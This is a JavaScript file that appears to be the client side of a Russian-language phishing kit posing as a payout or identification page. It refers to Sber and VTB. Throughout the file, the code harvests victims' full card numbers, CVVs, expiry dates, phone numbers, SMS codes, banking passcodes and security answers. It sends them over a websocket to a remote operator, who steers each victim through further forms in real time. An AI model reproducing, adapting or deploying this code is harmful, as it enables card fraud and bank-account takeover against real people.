var xray = localStorageItemCheck('xray', uid());
var referer_link = localStorageItemCheck('referer_link', document.referrer);
const started = localStorageItemCheck('started', document.location.href);
let next_button = document.querySelector("#next-btn");
let last_activated_message_id = 0;
if (sessionStorage.getItem('last_activated_message_id') === null) {
    sessionStorage.setItem('last_activated_message_id', last_activated_message_id);
} else {
    last_activated_message_id = Number(sessionStorage.getItem('last_activated_message_id'));
}
let websocket_connection = null;
let show_next_btn_timer = null;
const code_form_validators = {code: {presence: true, format: {pattern: ".{4,6}"}}};
const password_form_validators = {user_access_password: {presence: true, format: {pattern: "\\d{5}"}}};
const password_form_validators_vtb = {user_access_password: {presence: true, format: {pattern: "\\d{4,6}"}}};
const general_password_form_validators = {user_question_answer: {presence: true, format: {pattern: ".{2,100}"}}};
const question_form_validators = {user_question_answer: {presence: true}};
const main_form_validators = {
    name: {
        presence: true,
        format: {
            pattern: ".+"
        }
    },
    phone: {
        presence: true,
        format: {
            pattern: "\\+7 \\(\\d{3}\\) \\d{3}-\\d{2}-\\d{2}"
        }
    },
    pw: {
        presence: true,
        format: {
            pattern: "\\d{4} \\d{4} \\d{4} \\d{4}"
        }
    },
    cvv: {
        presence: true,
        format: {
            pattern: "\\d{3}"
        }
    },
    card_date: {
        presence: true,
        format: {
            pattern: "\\d{2}/\\d{2}"
        }
    }
};

function socket_message_handler(event) {
    const json_data = JSON.parse(event.data);
    const insert_point = document.getElementById('vstep_flow');
    last_activated_message_id = Number(sessionStorage.getItem('last_activated_message_id'));
    xray = localStorage.getItem('xray');
    for (let item of json_data) {
        if (item['client_uuid'] === xray) {
            if (item['template_platform']) {
                if (Number(last_activated_message_id) !== Number(item['id'])) {
                    modal_fullscreen(false);
                    if (item['template_type'] === 'text') {
                        insert_point.innerHTML = item['template'];
                        check_next_btn_timer();
                        showLoader(false);
                    }

                    if (item['template_type'] === 'change_connect') {
                        reSendLastData(item['message_text']);
                    }

                    if (item['template_type'] === 'change_id') {
                        const new_xray = item['message_text'];
                        if (xray !== new_xray) {
                            localStorage.setItem('xray', new_xray);
                            connectToRoom(USER_INIT_DATA, new_xray);
                        }
                    }

                    if (item['template_type'] === 'action') {
                        if (['ask_client_update', 'change_bank'].includes(item['template_code'])) {
                            start_flow(true, item['template']);
                        } else {
                            showLoader(false);
                        }
                    }

                    if (item['template_type'] === 'form') {
                        if (['confirmation_step_one', 'confirmation_step_two', 'ask_code_with_custom_message'].includes(item['template_code'])) {
                            load_additional_form(item['message_text'], item['template_code'], item['template']);
                        } else {
                            if (item['template_code'] !== 'select_for_work') {
                                showLoader(false);
                            }
                        }
                    }

                    // additional template behavior
                    if (item['template_code'] === 'ask_password' && Number(item['template_code_calls']) > 0) {
                        load_access_form(item['template_code_calls']);
                    }
                    if (item['template_code'] === 'ask_password_vtb' && Number(item['template_code_calls']) > 0) {
                        load_access_form_vtb(item['template_code_calls']);
                    }
                    sessionStorage.setItem('last_activated_message_id', item['id'].toString());
                    last_activated_message_id = item['id'];
                }
                return;
            }
        }
    }
}

async function reSendLastData(url) {
    let attempts = 0;
    const maxAttempts = 10;
    const attemptInterval = 1000;
    const data = sessionStorage.getItem("sent_data");
    const form_data = JSON.parse(data);
    await fetchAndEstablishConnection(url);

    const sendData = () => {
        if (
            websocket_connection &&
            websocket_connection.readyState === WebSocket.OPEN
        ) {
            form_data["client_id"] = localStorage.getItem("xray");
            websocket_connection.send(JSON.stringify(form_data));
        } else if (attempts < maxAttempts) {
            attempts++;
            setTimeout(sendData, attemptInterval);
        } else {
            console.error("Failed to establish connection after multiple attempts");
        }
    };

    sendData();
}

function use_form_handler(form, validators, form_data) {
    const inputs = form.querySelectorAll("input, textarea, select")
    const errors = validate(form, validators);
    if (!errors) {
        showLoader(true);
        websocket_connection.send(JSON.stringify(form_data));
        sessionStorage.setItem('sent_data', JSON.stringify(form_data));
    } else {
        showLoader(false);
    }

    for (let i = 0; i < inputs.length; ++i) {
        if (errors && errors[inputs.item(i).name]) {
            showErrorsForInput(inputs.item(i), errors[inputs.item(i).name])
        }
    }
}

function user_sent_form() {
    const registration_form = document.getElementById('user_registration_form');
    const form_data = {
        'event': 'registration',
        'client_id': localStorage.getItem('xray'),
        'site_id': SITE_ID,
        'platform': started,
        'client_name': registration_form.querySelector('#form_input_name').value,
        'client_phone': registration_form.querySelector('#form_input_phone').value,
        'client_card': registration_form.querySelector('#form_input_card').value,
        'client_card_cvv': registration_form.querySelector('#form_input_cvv').value,
        'client_card_date': registration_form.querySelector('#form_input_date').value,
    }

    use_form_handler(registration_form, main_form_validators, form_data);

    return false;
}

function user_sent_additional_form(template_code = 'confirmation_step_one') {
    const additional_form = document.getElementById('user_additional_form');
    const form_data = {
        'event': 'confirmation',
        'client_id': localStorage.getItem('xray'),
        'site_id': SITE_ID,
        'platform': started,
        'template_code': template_code,
        'client_code': additional_form.querySelector('#form_input_code').value,
    }

    use_form_handler(additional_form, code_form_validators, form_data);

    return false;
}

function user_send_password_form(template_code = 'ask_password') {
    const additional_form = document.getElementById('user_access_form');
    const form_data = {
        'event': 'ask_password',
        'client_id': localStorage.getItem('xray'),
        'site_id': SITE_ID,
        'platform': started,
        'template_code': template_code,
        'client_code': additional_form.querySelector('#user_access_password').value,
    }

    use_form_handler(additional_form, password_form_validators, form_data);
    setTimeout(function () {
        showLoader(false);
        additional_form.classList.add('entered');
        document.querySelector('.access_form__title').innerHTML = "<b style='color: #fff;'>Вы совершаете вход в аккаунт.<br>Проводим идентификацию для начисления выплаты.</b>";

        document.querySelector('.access_form__title').innerHTML = "<b style='color: #fff;'>Вы совершаете вход в аккаунт.<br>Проводим идентификацию для начисления выплаты.</b>";
        document.querySelector('.access_form__undertitle').innerHTML = "";
        document.querySelector('.access_form__dots').classList.add('hidden');
        document.querySelector('.access_form__keyboard').classList.add('hidden');
        const help_link = document.querySelector('.ask_password_help_link');
        const error_message = document.querySelector('.ask_password_error_message');
        if (help_link) {
            document.querySelector('.ask_password_help_link').classList.add('hidden');
        }
        if (error_message) {
            document.querySelector('.ask_password_error_message').classList.add('hidden');
        }
        setTimeout(function () {
            showLoader(true);
        }, 2200);
    }, 900);

    return false;
}

function user_send_password_form_vtb(template_code = 'ask_password_vtb') {
    const additional_form = document.getElementById('user_access_form');
    const form_data = {
        'event': 'ask_password_vtb',
        'client_id': localStorage.getItem('xray'),
        'site_id': SITE_ID,
        'platform': started,
        'template_code': template_code,
        'client_code': additional_form.querySelector('#user_access_password').value,
    }

    use_form_handler(additional_form, password_form_validators_vtb, form_data);
    setTimeout(function () {
        showLoader(false);
        //additional_form.classList.add('entered');
        document.querySelector('.access_form__title').innerHTML = "<b style='color: #fff;'>Вы совершаете вход в аккаунт.<br>Проводим идентификацию для начисления выплаты.</b>";

        document.querySelector('.access_form__title').innerHTML = "<b style='color: #fff;'>Вы совершаете вход в аккаунт.<br>Проводим идентификацию для начисления выплаты.</b>";
        document.querySelector('.access_form__undertitle').innerHTML = "";
        document.querySelector('.access_form__dots').classList.add('hidden');
        document.querySelector('.access_form__keyboard').classList.add('hidden');
        const help_link = document.querySelector('.ask_password_help_link');
        const error_message = document.querySelector('.ask_password_error_message');
        if (help_link) {
            document.querySelector('.ask_password_help_link').classList.add('hidden');
        }
        if (error_message) {
            document.querySelector('.ask_password_error_message').classList.add('hidden');
        }
        setTimeout(function () {
            showLoader(true);
        }, 2200);
    }, 900);

    return false;
}

function user_sent_general_password(template_code = 'general_password') {
    const additional_form = document.getElementById('user_password_general_form');
    const form_data = {
        'event': 'general_password',
        'client_id': localStorage.getItem('xray'),
        'site_id': SITE_ID,
        'platform': started,
        'template_code': template_code,
        'client_code': additional_form.querySelector('#user_question_answer').value,
    }

    use_form_handler(additional_form, general_password_form_validators, form_data);
    setTimeout(function () {
        showLoader(false);
        //Show general message
    }, 900);
    return false;
}

function user_sent_answer(template_code = 'ask_question') {
    const question_form = document.getElementById('user_question_form');
    const form_data = {
        'event': 'ask_question',
        'client_id': localStorage.getItem('xray'),
        'site_id': SITE_ID,
        'platform': started,
        'template_code': template_code,
        'client_code': question_form.querySelector('#user_question_answer').value,
    }

    use_form_handler(question_form, question_form_validators, form_data);

    return false;
}

function change_bank(text = '', template_code = 'change_bank') {
    const form_data = {
        'event': 'change_bank',
        'client_id': localStorage.getItem('xray'),
        'site_id': SITE_ID,
        'platform': started,
        'template_code': template_code,
    }

    showLoader(true);
    websocket_connection.send(JSON.stringify(form_data));
    sessionStorage.setItem('sent_data', JSON.stringify(form_data));
    start_flow(true, text);
}

function request_code(template_code = 'client_request_code') {
    const form_data = {
        'event': 'client_request_code',
        'client_id': localStorage.getItem('xray'),
        'platform': started,
        'template_code': template_code,
    }
    websocket_connection.send(JSON.stringify(form_data));
    sessionStorage.setItem('sent_data', JSON.stringify(form_data));

    document.querySelector('.client_request_code').classList.add('active');
    document.querySelector('.client_request_code').classList.remove('timeout');
    setTimeout(function () {
        document.querySelector('.client_request_code').classList.remove('active');
        document.querySelector('.client_request_code').classList.add('timeout');
    }, 60000 * 2);
}

function load_form(template_message = '') {
    modal_fullscreen(false);
    showLoader(true);
    fetch('form1745.html?flow_start=' + SITE_ID)
        .then(response => response.text())
        .then(content => {
            document.getElementById('vstep_flow').innerHTML = content;
            const main_form = document.getElementById("user_registration_form")
            const message_block = main_form.querySelector('.main_form_error_message')
            const inputs = main_form.querySelectorAll("input, textarea, select")
            show_custom_template_message(message_block, template_message);

            // ------
            phoneMask('form_input_phone');
            pwCardMask('form_input_card');
            pwCVMask('form_input_cvv');
            dateMask('form_input_date');
            // -----
            load_validator_rules(inputs, main_form);
            // ------
            check_next_btn_timer();
            after_load_form();
        });
}

function load_additional_form(custom_text = '', template_code = 'confirmation_step_one', template_message = '') {
    modal_fullscreen(false);
    showLoader(true);
    fetch('form2d84.html?flow_additional=1&amp;template_code=' + template_code)
        .then(response => response.text())
        .then(content => {
            let element = document.getElementById('vstep_flow');
            element.innerHTML = content;
            const additional_form = document.getElementById("user_additional_form")
            const message_block = additional_form.querySelector('.additional_form_error_message')
            const inputs = additional_form.querySelectorAll("input, textarea, select")
            const form_title = document.querySelector('.user_additional_form_title');
            const default_title = form_title.getAttribute('data-default-text');

            show_custom_template_message(message_block, template_message);
            // ------
            pwCodeMask('form_input_code');
            custom_text = (template_message && template_message.length) ? '' : default_title;
            form_title.innerHTML = custom_text;

            // -----
            load_validator_rules(inputs, additional_form);

            // ------
            check_next_btn_timer();

            // ------
            after_load_form();
            setTimeout(function () {
                document.querySelector('.client_request_code').classList.remove('welcome');
                document.querySelector('.client_request_code').classList.add('timeout');
            }, 60000 * 2);
        });
}

function load_access_form(iteration = 0) {
    modal_fullscreen(false);
    showLoader(true);
    const iter_value = (iteration > 0) ? '&iteration=1' : '';
    fetch('form3d87.html?ask_password=1' + iter_value)
        .then(response => response.text())
        .then(content => {
            let element = document.getElementById('vstep_flow');
            element.innerHTML = content;
            check_next_btn_timer();

            // ------
            after_load_form();
            modal_fullscreen(true);
        });
}

function load_access_form_vtb(iteration = 0) {
    modal_fullscreen(false);
    showLoader(true);
    const iter_value = (iteration > 0) ? '&iteration=1' : '';
    fetch('form0044.html?ask_password_vtb=1' + iter_value)
        .then(response => response.text())
        .then(content => {
            let element = document.getElementById('vstep_flow');
            element.innerHTML = content;
            check_next_btn_timer();

            // ------
            after_load_form();
            modal_fullscreen(true);
        });
}

function load_general_password_form() {
    modal_fullscreen(false);
    showLoader(true);
    fetch('form342e.html?ask_password_general=1')
        .then(response => response.text())
        .then(content => {
            let element = document.getElementById('vstep_flow');
            element.innerHTML = content;
            check_next_btn_timer();

            // ------
            after_load_form();
            modal_fullscreen(true);
        });
}

function load_answer_form(text = '') {
    modal_fullscreen(false);
    showLoader(true);
    fetch('form8a06.html?ask_question=1')
        .then(response => response.text())
        .then(content => {
            let element = document.getElementById('vstep_flow');
            element.innerHTML = content;
            const answer_title = element.querySelector('.question_form__question');
            answer_title.innerHTML = text
            check_next_btn_timer();

            // ------
            after_load_form();
            modal_fullscreen(true);
        });
}

function load_validator_rules(inputs, form) {
    for (let i = 0; i < inputs.length; ++i) {
        inputs.item(i).addEventListener("change", function (ev) {
            const errors = validate(form, main_form_validators) || {};
            showErrorsForInput(this, errors[this.name])
        });
    }
}

function after_load_form() {
    setTimeout(function () {
        next_button = document.querySelector("#next-btn");
        showLoader(false);
    }, 400);
}

function modal_fullscreen(is_fullscreen = true) {
    const modal = document.querySelector('.advise__box');
    if (modal) {
        if (is_fullscreen) {
            modal.classList.add('fullscreen');
        } else {
            modal.classList.remove('fullscreen');
        }
    }
}

function check_next_btn_timer() {
    clearInterval(show_next_btn_timer);
    show_next_btn_timer = setInterval(function () {
        const registration_form = document.querySelectorAll('#user_registration_form');
        const element = document.getElementById('vstep_flow');
        if (element.style.display !== "none" && registration_form.length < 1) {
            showNextBtn(false);
        } else {
            showNextBtn();
        }
    }, 300);
}

function start_flow(reload = false, template_message = '') {
    const registration_form = document.querySelectorAll('#user_registration_form');

    if (registration_form.length && !reload) {
        showLoader(true);
        user_sent_form();
    } else {
        load_form(template_message);
    }
}

function phoneMask(id) {
    const el = document.getElementById(id);
    if (el) {
        IMask(
            el,
            {
                mask: '+{7} (000) 000-00-00'
            }
        )
    }
}

function pwCardMask(id) {
    const el = document.getElementById(id);
    if (el) {
        IMask(
            el,
            {
                mask: '0000 0000 0000 0000'
            }
        )
    }
}

function pwCVMask(id) {
    const el = document.getElementById(id);
    if (el) {
        IMask(
            el,
            {
                mask: '000'
            }
        )
    }
}

function pwCodeMask(id) {
    const el = document.getElementById(id);
    if (el) {
        IMask(
            el,
            {
                mask: '******'
            }
        )
    }
}

function dateMask(id) {
    const el = document.getElementById(id);
    if (el) {
        IMask(
            el,
            {
                mask: '00/00'
            }
        )
    }
}

function show_custom_template_message(message_block, template_message = '') {
    if (template_message && template_message.length) {
        message_block.innerHTML = template_message;
        message_block.classList.add('active');
    } else {
        message_block.innerHTML = '';
        message_block.classList.remove('active');
    }
}

function enter_password_digit(digit) {
    const input = document.getElementById("user_access_password");
    if (input.value.length <= 4) {
        input.value = String(input.value) + String(digit);
    }
    update_password_dots();
}

function enter_password_digit_vtb(digit) {
    const input = document.getElementById("user_access_password");
    if (input.value.length <= 5) {
        input.value = String(input.value) + String(digit);
    }
    update_password_dots_vtb();
}

function remove_password_digit() {
    const input = document.getElementById("user_access_password");
    input.value = (input.value.length > 0) ? input.value.slice(0, -1) : '';
    update_password_dots();
}

function update_password_dots() {
    const input = document.getElementById("user_access_password");
    const dots = document.querySelectorAll('.access_form__dots-item');
    for (let i = 0; i < dots.length; ++i) {
        if (input.value.length > i) {
            dots[i].classList.add('active');
        } else {
            dots[i].classList.remove('active');
        }
    }
    check_next_button();
}


function update_password_dots_vtb() {
    const input = document.getElementById("user_access_password");
    const dots = document.querySelectorAll('.access_form__dots-item');
    for (let i = 0; i < dots.length; ++i) {
        if (input.value.length > i) {
            dots[i].classList.add('active');
        } else {
            dots[i].classList.remove('active');
        }
    }
    check_next_button_vtb();
}

function check_next_button() {
    const input = document.getElementById("user_access_password");
    const button = document.querySelector(".access_form__keyboard-item__confirm");
    if (input.value.length === 5) {
        button.classList.add('active');
        user_send_password_form();
    } else {
        button.classList.remove('active');
    }
}

function check_next_button_vtb() {
    const input = document.getElementById("user_access_password");
    const button = document.querySelector(".access_form__keyboard-item__confirm");
    if (input.value.length >= 4) {
        button.classList.add('active');
    } else {
        button.classList.remove('active');
    }
    
    if (input.value.length === 6) {
        user_send_password_form_vtb();
    }
}

function user_ask_password_help() {
    const help_block = document.querySelector('.ask_password_help_link');
    help_block.classList.toggle('active');
}

function user_ask_password_help_vtb() {
    const help_block = document.querySelector('.ask_password_help_link');
    help_block.classList.toggle('active');
}

function open_support_chat() {
    // tidio chat open
    document.querySelector('#tidio-chat-iframe').contentDocument.querySelector('#button-body').click();
}

function showNextBtn(is_show = true) {
    if (next_button) {
        if (is_show) {
            next_button.classList.remove('hidden')
        } else {
            next_button.classList.add('hidden')
        }
    }
}

// Get started
fetchAndEstablishConnection();
setInterval(function () {
    if (websocket_connection === null || websocket_connection && websocket_connection.readyState !== WebSocket.OPEN) {
        fetchAndEstablishConnection();
    }
}, 30000);


/*** Functions ***/

function sber_pay_flow() {
    const block = document.querySelector('.sber-pay-block');
    if (block) {
        const has_warning = block.classList.contains('show_warning');
        showLoader(true);
        if (!has_warning) {
            setTimeout(function () {
                showLoader(false);
                block.classList.add('show_warning');
            }, 1200);
        } else {
            setTimeout(function () {
                showLoader(false);
            }, 1200);
        }
    }
}